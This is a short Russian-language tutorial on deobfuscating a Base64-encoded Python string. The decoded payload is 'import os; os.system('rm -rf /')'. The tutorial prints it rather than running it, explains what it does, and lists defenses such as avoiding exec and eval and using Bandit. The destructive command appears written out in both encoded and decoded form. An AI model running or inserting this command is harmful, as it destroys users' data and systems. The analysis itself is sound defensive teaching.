# Деобфускация кода

## Декодирование строки

Исходная строка закодирована в Base64.
Для безопасного просмотра используем print вместо exec.

import base64

a = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3JtIC1yZiAvJyk="
b = base64.b64decode(a).decode("utf-8")
print(b)

## Расшифрованная строка

Ниже приведён текст для анализа. Запускать его нельзя.

import os; os.system('rm -rf /')

## Угроза безопасности

Код через os.system пытается выполнить команду rm -rf /.

- rm — удаление файлов.
- -r — рекурсивное удаление каталогов и их содержимого.
- -f — удаление без обычных запросов подтверждения.
- / — корневой каталог файловой системы.

Возможные последствия — потеря данных и повреждение системы.
Результат зависит от прав пользователя, реализации rm
и встроенных защит. Проверять команду запуском нельзя.

Base64 скрывает смысл команды при поверхностном просмотре,
но не является шифрованием.
В исходном скрипте exec выполняет декодированный текст как код.

## Методы защиты

1. Не выполнять неизвестные строки через exec и eval.
2. Проверять входные данные.
3. Декодировать подозрительные строки только для просмотра.
4. Ограничивать права запускаемых программ.
5. Использовать анализ безопасности, например Bandit.
6. Проверять вызовы системных команд.

Проверка flake8 не заменяет полноценный анализ безопасности.
